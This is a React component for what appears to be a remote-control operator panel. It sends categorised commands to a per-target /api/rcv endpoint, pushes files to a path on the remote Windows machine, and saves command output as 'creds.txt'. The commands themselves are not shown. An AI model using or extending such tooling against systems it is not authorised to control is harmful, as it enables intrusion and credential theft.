import React, { useEffect, useState } from 'react';
import Cookies from 'js-cookie';
import './BottomBar.css'
import { operationsArray } from '../../Utils/operations';





export const BottomBar=({ id="", setExternalCmd, externalCmd })=> {

    const [activeDropdown, setActiveDropdown] = useState(null);
    const categories = [...new Set(operationsArray.map(op => op.category))];

    const [file, setFile] = useState(null);


    const download =(file_name, content, type = 'text/plain')=> {
        const blob = new Blob([content], { type: type });
        const url = URL.createObjectURL(blob);

        const enlace = document.createElement('a');
        enlace.href = url;
        enlace.download = file_name;
        enlace.style.display = 'none';

        document.body.appendChild(enlace);
        enlace.click();

        // Limpieza
        document.body.removeChild(enlace);
        URL.revokeObjectURL(url);
    }

    const handleUpload = async () => {
        if (!file) return;
        
        let destination=`C:\\Temp\\${file.name}`
        destination = prompt(`Ingrese la ruta, ruta por defecto C:\\Temp\\${file.name}`);
        if(!destination || destination === null || destination==="") destination=`C:\\Temp\\${file.name}`

        const formData = new FormData();
        formData.append("file", file);
        formData.append("destination", destination);

        const response = await fetch(`http://localhost:4000/api/rcv/upload/${id}`, {
            method: 'POST',
            body: formData,
            headers: {
                "x-token": `${Cookies.get('x-token')}`
            }
        });
    };


  const cmd = async (input, type="") => {

    if (type === "external") {
        setExternalCmd(input);
        return;
    }


    try {
      const response = await fetch(`http://localhost:4000/api/rcv/${id}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd: input })
      });

      if (!response.ok) throw new Error(`Error del servidor: ${response.status}`);

      const data = await response.json();

      if (type==="download" ) {
          download("creds.txt", data.result)
      }

      
    } catch (error) {
      console.error('Error en customCommand:', error);
    }
  };



  const getOperationsByCategory = (category) =>
    operationsArray.filter(op => op.category === category);

  const toggleDropdown = (category) => {
    setActiveDropdown(activeDropdown === category ? null : category);
  };



   return (
    <nav className="navbar">
      {categories.map((category) => (
        <div className="dropdown" key={category}>
          <button className="dropdown-button" onClick={() => toggleDropdown(category)}>
            {category}
          </button>
          {activeDropdown === category && (
            <div className="dropdown-content">
              {getOperationsByCategory(category).map(({ name, command, type }) => (
                <div className="dropdown-item" key={name}>
                  <strong>{name}</strong>
                  <pre className="command">
                    <button className="launch-btn" onClick={() => cmd(command, type)}>Run</button> {command}
                  </pre>
                </div>
              ))}
            </div>
          )}
        </div>
      ))}
    </nav>
  );
}

